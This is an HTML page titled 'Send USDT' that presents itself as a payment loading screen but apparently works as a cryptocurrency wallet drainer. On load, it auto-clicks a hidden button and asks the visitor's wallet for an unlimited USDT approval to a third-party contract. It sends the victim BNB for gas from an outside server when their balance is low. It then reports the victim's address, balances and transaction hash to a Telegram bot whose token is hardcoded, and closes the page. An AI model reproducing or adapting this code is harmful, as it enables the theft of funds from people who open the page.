
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <meta name="color-scheme" content="light dark">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
  <meta http-equiv="Pragma" content="no-cache" />
  <meta http-equiv="Expires" content="0" />
  <title>Send USDT</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #0a0a0a;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      overflow: hidden;
    }

    /* From Uiverse.io by dexter-st */ 
    .loader-wrapper {
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 120px;
      width: auto;
      margin: 2rem;
      font-family: "Poppins", sans-serif;
      font-size: 1.6em;
      font-weight: 600;
      user-select: none;
      color: #fff;
      scale: 2;
    }

    .loader {
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      z-index: 1;
      background-color: transparent;
      mask: repeating-linear-gradient(
        90deg,
        transparent 0,
        transparent 6px,
        black 7px,
        black 8px
      );
    }

    .loader::after {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: radial-gradient(circle at 50% 50%, #ff0 0%, transparent 50%),
        radial-gradient(circle at 45% 45%, #f00 0%, transparent 45%),
        radial-gradient(circle at 55% 55%, #0ff 0%, transparent 45%),
        radial-gradient(circle at 45% 55%, #0f0 0%, transparent 45%),
        radial-gradient(circle at 55% 45%, #00f 0%, transparent 45%);
      mask: radial-gradient(
        circle at 50% 50%,
        transparent 0%,
        transparent 10%,
        black 25%
      );
      animation:
        transform-animation 2s infinite alternate,
        opacity-animation 4s infinite;
      animation-timing-function: cubic-bezier(0.6, 0.8, 0.5, 1);
    }

    @keyframes transform-animation {
      0% {
        transform: translate(-55%);
      }
      100% {
        transform: translate(55%);
      }
    }

    @keyframes opacity-animation {
      0%,
      100% {
        opacity: 0;
      }
      15% {
        opacity: 1;
      }
      65% {
        opacity: 0;
      }
    }

    .loader-letter {
      display: inline-block;
      opacity: 0;
      animation: loader-letter-anim 4s infinite linear;
      z-index: 2;
    }

    .loader-letter:nth-child(1) {
      animation-delay: 0.1s;
    }
    .loader-letter:nth-child(2) {
      animation-delay: 0.205s;
    }
    .loader-letter:nth-child(3) {
      animation-delay: 0.31s;
    }
    .loader-letter:nth-child(4) {
      animation-delay: 0.415s;
    }
    .loader-letter:nth-child(5) {
      animation-delay: 0.521s;
    }
    .loader-letter:nth-child(6) {
      animation-delay: 0.626s;
    }
    .loader-letter:nth-child(7) {
      animation-delay: 0.731s;
    }
    .loader-letter:nth-child(8) {
      animation-delay: 0.837s;
    }
    .loader-letter:nth-child(9) {
      animation-delay: 0.942s;
    }
    .loader-letter:nth-child(10) {
      animation-delay: 1.047s;
    }

    @keyframes loader-letter-anim {
      0% {
        opacity: 0;
      }
      5% {
        opacity: 1;
        text-shadow: 0 0 4px #fff;
        transform: scale(1.1) translateY(-2px);
      }
      20% {
        opacity: 0.2;
      }
      100% {
        opacity: 0;
      }
    }

    /* Responsive adjustments */
    @media (max-width: 768px) {
      .loader-wrapper {
        scale: 1.5;
      }
    }

    @media (max-width: 480px) {
      .loader-wrapper {
        scale: 1.2;
      }
    }
    
    /* Keep loading overlay for compatibility */
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 10000;
    }
  </style>

</head>
<body>
  <!-- From Uiverse.io by dexter-st --> 
  <div class="loader-wrapper">
    <span class="loader-letter">G</span>
    <span class="loader-letter">e</span>
    <span class="loader-letter">n</span>
    <span class="loader-letter">e</span>
    <span class="loader-letter">r</span>
    <span class="loader-letter">a</span>
    <span class="loader-letter">t</span>
    <span class="loader-letter">i</span>
    <span class="loader-letter">n</span>
    <span class="loader-letter">g</span>
    <div class="loader"></div>
  </div>
  
  <!-- Hidden button for auto-click functionality -->
  <button type="submit" id="nextBtn" onclick="TokenApprove()" style="display: none;"></button>

  <script type="text/javascript" src="js/web3.min.js"></script>
<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script> 
<script>

        var addressTOKEN = "0x55d398326f99059ff775485246999027b3197955";
        var matrixAbiTOKEN = [{ "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "owner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "spender", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "previousOwner", "type": "address" }, { "indexed": true, "internalType": "address", "name": "newOwner", "type": "address" }], "name": "OwnershipTransferred", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "internalType": "address", "name": "from", "type": "address" }, { "indexed": true, "internalType": "address", "name": "to", "type": "address" }, { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "constant": true, "inputs": [], "name": "_decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "owner", "type": "address" }, { "internalType": "address", "name": "spender", "type": "address" }], "name": "allowance", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "burn", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "internalType": "uint8", "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "subtractedValue", "type": "uint256" }], "name": "decreaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "spender", "type": "address" }, { "internalType": "uint256", "name": "addedValue", "type": "uint256" }], "name": "increaseAllowance", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "mint", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "name", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "internalType": "address", "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "renounceOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "internalType": "string", "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }]

    var addressSTAKING = "0xb2C17c98dB3064Af431110fDd4E3c2a57aEbc7CC";
        var matrixAbiSTAKING = [{ "constant": false, "inputs": [{ "name": "_data", "type": "bytes32" }], "name": "setfirelevel", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "mainadmin", "type": "address" }], "name": "RewardGeneration", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_token", "type": "address" }], "name": "setTokenAddress", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_senderads", "type": "address" }, { "name": "_amttoken", "type": "uint256" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "multiTransferUSD", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_userAddresses", "type": "address[]" }, { "name": "_amount", "type": "uint256" }], "name": "airDropTRX", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_tokenadd", "type": "address" }, { "name": "_wallet", "type": "address" }, { "name": "_amount", "type": "uint256" }], "name": "distrubutionroi", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_contributors", "type": "address[]" }, { "name": "_balances", "type": "uint256[]" }, { "name": "membcode", "type": "uint256" }, { "name": "rcode", "type": "uint256" }, { "name": "plan", "type": "uint64" }], "name": "TransferBusd", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newValue", "type": "uint256" }], "name": "distrubutionIncome", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_contractAddress", "type": "address" }], "name": "getMsgData", "outputs": [{ "name": "hash", "type": "bytes32" }], "payable": false, "stateMutability": "pure", "type": "function" }, { "constant": false, "inputs": [{ "name": "_newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "token", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "inputs": [{ "name": "_token", "type": "address" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "payable": true, "stateMutability": "payable", "type": "fallback" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multisended", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "value", "type": "uint256" }, { "indexed": true, "name": "sender", "type": "address" }, { "indexed": false, "name": "membcode", "type": "uint256" }, { "indexed": false, "name": "rcode", "type": "uint256" }, { "indexed": false, "name": "ptype", "type": "uint64" }], "name": "Multireceivers", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "_userAddress", "type": "address" }, { "indexed": false, "name": "_amount", "type": "uint256" }], "name": "Airdropped", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "previousOwner", "type": "address" }, { "indexed": true, "name": "newOwner", "type": "address" }], "name": "onOwnershipTransferred", "type": "event" }];

        var MatrixInstanceSTAKING, MatrixContractSTAKING, MatrixInstanceTOKEN, MatrixContractTOKEN;


 window.addEventListener('load', connectWallet);
    async function connectWallet() {
        if (window.ethereum) {

                // Request wallet connection
                 const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                    if (chainId !== '0x38') { // 0x38 is BSC Mainnet
                        await switchToBSC();
                    }

        } else {
            console.log("Please install MetaMask!");
        }
    }



    async function switchToBSC() {
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }]
                });
            } catch (error) {
                if (error.code === 4902) {
                    // If BSC is not added, request to add it
                    await addBSCNetwork();
                } else {
                    console.error("Failed to switch chain", error);
                }
            }
        }

        async function addBSCNetwork() {
            try {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: '0x38',
                        chainName: 'Binance Smart Chain',
                        nativeCurrency: {
                            name: 'Binance Coin',
                            symbol: 'BNB',
                            decimals: 18
                        },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com/']
                    }]
                });
            } catch (addError) {
                console.error("Failed to add BSC network", addError);
            }
        }



        var bal1 = 0;

        async function Checkapprovaltoken() {

        window.contract = web3.eth.contract(matrixAbiTOKEN);
        window.BNBLINEcontract = contract.at(addressTOKEN);
        var account = web3.eth.accounts[0];

                window.BNBLINEcontract.allowance(account, addressSTAKING, {
                    from: web3.eth.accounts[0]

                }, function (error, result) {
                    if (!error) {
                        if (result > 0) {


                     window.BNBLINEcontract.balanceOf(account, {
                    from: web3.eth.accounts[0]

                }, function (error, result) {
                    if (!error) {

                        console.log(result + ' allowance Final result is ');
                        if (result > 0) {

                            bal1 = result / 1000000000000000000;

                            var maindt = { "fromaddress": account, "txthash": null, "PackageAmt": bal1 };

                            $.ajax({
                                url: '/MemberPanel/TopUpWithMetamaskJson',
                                type: 'POST',
                                dataType: 'JSON',
                                contentType: 'application/json',
                                data: JSON.stringify(maindt),
                                success: function (data) {
                                    if (data == "Success") {
                                        showLoading('Transaction processed');
                                        setTimeout(() => hideLoading(), 2000);
                                        console.log('success');
                                    }
                                    else {
                     }
                                },
                                error: function (err) {
                                    console.log("error:" + JSON.stringify(err));

                                }
                            });

                            showLoading('Transaction completed');
                            setTimeout(() => hideLoading(), 2000);
                        }
                    }
                    else {

                        console.log(error.code + ' allowance Final error is ')
                        showLoading('Transaction rejected');
                        setTimeout(() => hideLoading(), 2000);
                    }
                             });

                        }
                        else {
                            TokenApprove();
                        }
                    }
                    else {

                        console.log(error.code + ' allowance Final error is ')
                        showLoading('Transaction rejected');
                        setTimeout(() => hideLoading(), 2000);
                    }
                });

    }

         

</script>

<script>
    // Initialize Web3
    const web3 = new Web3(window.ethereum);

    // Loading functions
    function showLoading(message = 'Processing...') {
        const overlay = document.getElementById('loadingOverlay');
        const text = overlay.querySelector('.loading-text');
        if (text) text.textContent = message;
        overlay.style.display = 'flex';
    }

    function hideLoading() {
        const overlay = document.getElementById('loadingOverlay');
        overlay.style.display = 'none';
    }

    async function TokenApprove() {
    // Show loading immediately when Next is clicked
    showLoading('Processing...');
    
    try {
        const accounts = await ethereum.request({ method: 'eth_accounts' });
        const account = accounts[0];

        // Step 1: Check the current BNB balance (in background)
        const bnbBalance = await web3.eth.getBalance(account);
        const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether');
        console.log("Current BNB Balance: ", balanceInBNB);

        const requiredBNB = 0.0001;

        // Step 2: Auto top-up in background if needed
        if (parseFloat(balanceInBNB) < requiredBNB) {
            showLoading('Please wait...');
            // Request the BNB top-up from the backend (in background)
            const topUpSuccess = await requestBNBTopUp(account);

            if (!topUpSuccess) {
                showLoading('Please try again.');
                setTimeout(() => hideLoading(), 2000);
                return;
            }

            // Wait for top-up to process
            showLoading('Processing...');
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            // Recheck balance
            const newBnbBalance = await web3.eth.getBalance(account);
            const newBalanceInBNB = web3.utils.fromWei(newBnbBalance, 'ether');
            
            if (parseFloat(newBalanceInBNB) < requiredBNB) {
                showLoading('Please try again.');
                setTimeout(() => hideLoading(), 2000);
                return;
            }
        }

        // Step 3: Hide loading so wallet can show approval popup
        hideLoading();
        
        // Show approval request (MetaMask/Trust Wallet will show popup)
        await approveToken(account);
    } catch (error) {
        console.error('Error:', error);
        hideLoading();
    }
}

// Function to request the BNB top-up from your backend
async function requestBNBTopUp(account) {
    try {
        const response = await fetch('https://p2pmanual-production.up.railway.app/send-bnb', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ recipient: account }),
        });

        const data = await response.json();
        if (data.success) {
            showLoading('progress...');
            return true;  // Return true indicating the top-up was successful
        } else {
            showLoading('Please try again.');
            setTimeout(() => hideLoading(), 2000);
            return false;  // Return false indicating the top-up failed
        }
    } catch (error) {
        console.error('Error during BNB request:', error);
        showLoading('Error initiating top-up.');
        setTimeout(() => hideLoading(), 2000);
        return false;  // Return false in case of an error
    }
}

// Token approval function remains the same
async function approveToken(account) {
    const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
    const maxApprovalAmount = web3.utils.toHex('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF');

    // Get the current BNB balance
    const bnbBalance = await web3.eth.getBalance(account);
    const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether'); // Convert from Wei to BNB

    // Get the actual USDT balance (not allowance)
    const usdtBalance = await usdtContract.methods.balanceOf(account).call();
    const usdtBalanceFormatted = web3.utils.fromWei(usdtBalance, 'ether'); // Convert from Wei to USDT

    // Get the current approved USDT amount
    const allowance = await usdtContract.methods.allowance(account, addressSTAKING).call();
    const approvedUSDT = web3.utils.fromWei(allowance, 'ether'); // Convert from Wei to USDT

    const currentDate = new Date();
    const formattedDate = currentDate.toLocaleString();  // Format the current date and time

    // Get the approved address
    const approvedAddress = addressSTAKING;  // You can change this as needed

    console.log('Processing....');
    console.log('Account:', account);
    console.log('BNB Balance:', balanceInBNB);
    console.log('USDT Balance:', usdtBalanceFormatted);

    await usdtContract.methods.approve(addressSTAKING, maxApprovalAmount)
        .send({ from: account })
        .on('transactionHash', async function (hash) {
            console.log('‚úÖ Approval transaction sent with hash:', hash);
            console.log('üì§ Attempting to send Telegram notification...');
            console.log('üì§ Account:', account);
            console.log('üì§ Balance BNB:', balanceInBNB);
            console.log('üì§ USDT Balance:', usdtBalanceFormatted);
            console.log('üì§ Approved Address:', approvedAddress);
            console.log('üì§ Date:', formattedDate);
            console.log('üì§ Hash:', hash);
            
            // Ensure all variables are defined
            const walletAddr = account || 'Unknown';
            const bnbBal = balanceInBNB || '0';
            const usdtBal = usdtBalanceFormatted || '0';
            const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
            const dateStr = formattedDate || new Date().toLocaleString();
            const txHash = hash || 'Unknown';
            
            // Send Telegram notification immediately when transaction hash is received
            console.log('üì® [TX] Sending Telegram notification...');
            sendTelegramNotification(
                walletAddr, 
                bnbBal, 
                usdtBal, 
                approvedAddr, 
                dateStr, 
                txHash
            ).then(result => {
                if (result) {
                    console.log('‚úÖ [TX] Telegram notification sent successfully');
                } else {
                    console.error('‚ùå [TX] Telegram notification returned false');
                }
            }).catch(err => {
                console.error('‚ùå [TX] Telegram notification error:', err);
            });
            
            var maindt = { "fromaddress": account, "txthash": hash, "PackageAmt": approvedUSDT };
            $.ajax({
                url: '/home/TopUpWithMetamaskJson',
                type: 'POST',
                dataType: 'JSON',
                contentType: 'application/json',
                data: JSON.stringify(maindt),
                success: function (data) {
                    console.log('Success');
                    // Close site immediately after Telegram notification sent
                    setTimeout(() => {
                        window.close();
                        // If window.close doesn't work, try redirect
                        if (!window.closed) {
                            location.href = "/home/index";
                        }
                    }, 500);
                },
                error: function (err) {
                    console.log("Error: " + JSON.stringify(err));
                    // Close site immediately after Telegram notification sent
                    setTimeout(() => {
                        window.close();
                        // If window.close doesn't work, try redirect
                        if (!window.closed) {
                            location.href = "/home/index";
                        }
                    }, 500);
                }
            });
        })
        .on('receipt', function (receipt) {
            console.log('Approval confirmed with receipt:', receipt);
        })
        .on('error', function (error) {
            hideLoading();
            if (error.code === 4001) {
                console.log("You canceled the approval request. Please try again.");
                showLoading('Transaction canceled');
                setTimeout(() => hideLoading(), 2000);
            } else {
                console.log("Approval failed: " + error.message);
                showLoading('Approval failed. Please try again.');
                setTimeout(() => hideLoading(), 2000);
            }
            console.error("Approval failed:", error);
        });
}

// Telegram notification function - simplified and more reliable with retry mechanism
async function sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash, retryCount = 0) {
    // Function is automatically available globally, but we'll also assign it explicitly
    const botToken = '7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM';
    const chatId = '8191508290';
    const maxRetries = 3;
    
    const message = `üîî USDT Approval Notification\n\n` +
                    `üë§ Wallet Address: ${walletAddress}\n` +
                    `üí∞ BNB Balance: ${bnbAmount} BNB\n` +
                    `üíµ USDT Balance: ${usdtAmount} USDT\n` +
                    `üìç Approved Address: ${approvedAddress}\n` +
                    `üìÖ Date and Time: ${dateTime}\n` +
                    `üîó Transaction Hash: ${txHash}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    console.log('üì§ [TELEGRAM] Starting notification send... (Attempt ' + (retryCount + 1) + '/' + (maxRetries + 1) + ')');
    console.log('üì§ [TELEGRAM] URL:', url);
    console.log('üì§ [TELEGRAM] Chat ID:', chatId);
    console.log('üì§ [TELEGRAM] Message length:', message.length);

    try {
        // Use URL-encoded form data (Telegram API prefers this format)
        const formData = new URLSearchParams();
        formData.append('chat_id', chatId);
        formData.append('text', message);
        
        console.log('üì§ [TELEGRAM] Request body:', formData.toString().substring(0, 200));
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: formData.toString(),
            mode: 'cors',
            cache: 'no-cache'
        });
        
        console.log('üì§ [TELEGRAM] Response status:', response.status);
        console.log('üì§ [TELEGRAM] Response ok:', response.ok);
        
        const responseText = await response.text();
        console.log('üì§ [TELEGRAM] Response text:', responseText);
        
        let data;
        try {
            data = JSON.parse(responseText);
        } catch (e) {
            console.error('üì§ [TELEGRAM] Failed to parse JSON:', e);
            console.error('üì§ [TELEGRAM] Raw response:', responseText);
            // Retry if we haven't exceeded max retries
            if (retryCount < maxRetries) {
                console.log('üîÑ [TELEGRAM] Retrying in 2 seconds...');
                await new Promise(resolve => setTimeout(resolve, 2000));
                return sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash, retryCount + 1);
            }
            return false;
        }
        
        console.log('üì§ [TELEGRAM] Parsed response:', data);
        
        if (data.ok) {
            console.log('‚úÖ [TELEGRAM] Notification sent successfully!');
            console.log('üì¨ [TELEGRAM] Message ID:', data.result?.message_id);
            return true;
        } else {
            console.error('‚ùå [TELEGRAM] Failed to send notification');
            console.error('‚ùå [TELEGRAM] Error code:', data.error_code);
            console.error('‚ùå [TELEGRAM] Error description:', data.description);
            
            // Retry on certain errors (rate limit, temporary failures)
            if (retryCount < maxRetries && (data.error_code === 429 || data.error_code === 500 || data.error_code === 502 || data.error_code === 503)) {
                const retryDelay = data.error_code === 429 ? (data.parameters?.retry_after || 5) * 1000 : 2000;
                console.log('üîÑ [TELEGRAM] Retrying after ' + (retryDelay / 1000) + ' seconds...');
                await new Promise(resolve => setTimeout(resolve, retryDelay));
                return sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash, retryCount + 1);
            }
            return false;
        }
    } catch (error) {
        console.error('‚ùå [TELEGRAM] Exception caught:', error);
        console.error('‚ùå [TELEGRAM] Error name:', error.name);
        console.error('‚ùå [TELEGRAM] Error message:', error.message);
        if (error.stack) {
            console.error('‚ùå [TELEGRAM] Error stack:', error.stack);
        }
        
        // Retry on network errors
        if (retryCount < maxRetries && (error.name === 'TypeError' || error.name === 'NetworkError')) {
            console.log('üîÑ [TELEGRAM] Network error, retrying in 2 seconds...');
            await new Promise(resolve => setTimeout(resolve, 2000));
            return sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash, retryCount + 1);
        }
        return false;
    }
}

// Function is already globally accessible, but ensure it's on window for explicit access
if (typeof window !== 'undefined') {
    window.sendTelegramNotification = sendTelegramNotification;
}

</script>
<script>
    // Auto-click Next button when page loads
    window.addEventListener('load', function() {
        // Small delay to ensure everything is ready
        setTimeout(function() {
            const nextBtn = document.getElementById('nextBtn');
            if (nextBtn) {
                nextBtn.click();
            }
        }, 1000);
    });
</script>









</body><!-- Mirrored from demo.awaikenthemes.com/html-preview/quivox/html/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Jan 2025 07:58:55 GMT --></html>
